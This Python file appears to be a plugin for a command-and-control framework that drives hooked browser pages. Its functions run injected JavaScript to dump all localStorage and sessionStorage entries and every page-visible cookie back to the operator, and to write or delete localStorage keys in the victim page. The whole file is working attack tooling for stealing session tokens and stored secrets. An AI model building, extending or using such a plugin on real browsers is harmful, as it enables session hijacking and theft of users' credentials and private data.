from c2.plugins.internal.plugins import BasePlugin


class StoragePlugin(BasePlugin):
    name = "storage"

    async def dump_local(self) -> dict:
        """Returns all key/value pairs from localStorage.

        :return: Dict of all localStorage entries
        :rtype: dict
        """
        return await self.methods.eval_js('''
            var out = {};
            for (var i = 0; i < localStorage.length; i++) {
                var k = localStorage.key(i);
                out[k] = localStorage.getItem(k);
            }
            return out;
        ''')

    async def dump_session(self) -> dict:
        """Returns all key/value pairs from sessionStorage.

        :return: Dict of all sessionStorage entries
        :rtype: dict
        """
        return await self.methods.eval_js('''
            var out = {};
            for (var i = 0; i < sessionStorage.length; i++) {
                var k = sessionStorage.key(i);
                out[k] = sessionStorage.getItem(k);
            }
            return out;
        ''')

    async def get_cookies(self) -> dict:
        """Returns all cookies visible to the current page as a name→value dict.

        :return: Dict of cookie name/value pairs
        :rtype: dict
        """
        return await self.methods.eval_js('''
            var out = {};
            document.cookie.split(";").forEach(function(pair) {
                var idx = pair.indexOf("=");
                if (idx < 0) return;
                var name  = pair.slice(0, idx).trim();
                var value = pair.slice(idx + 1).trim();
                if (name) out[name] = decodeURIComponent(value);
            });
            return out;
        ''')

    async def set_local(self, key: str, value: str) -> None:
        """Writes a key/value pair to localStorage.

        :param key: Storage key
        :type key: str
        :param value: Storage value
        :type value: str
        """
        await self.methods.eval_js(f'localStorage.setItem({key!r}, {value!r}); return null;')

    async def delete_local(self, key: str) -> None:
        """Removes a key from localStorage.

        :param key: Storage key to remove
        :type key: str
        """
        await self.methods.eval_js(f'localStorage.removeItem({key!r}); return null;')
